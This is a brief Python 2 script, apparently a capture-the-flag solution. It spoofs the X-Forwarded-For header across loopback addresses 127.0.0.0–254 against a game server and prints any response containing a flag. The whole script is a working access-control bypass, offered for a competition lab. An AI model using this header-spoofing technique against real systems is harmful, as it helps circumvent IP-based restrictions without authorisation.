import requests

target_url = 'http://game.sycsec.com:50080/69e57206e1bc2a23/'


s = requests.Session()
for i in xrange(255):
    head = {'X-Forwarded-For': '127.0.0.' + str(i)}
    r = s.get(target_url, headers= head)
    if 'flag' in r.content:
        print "now in 127.0.0.%s"%(i)
        print r.content

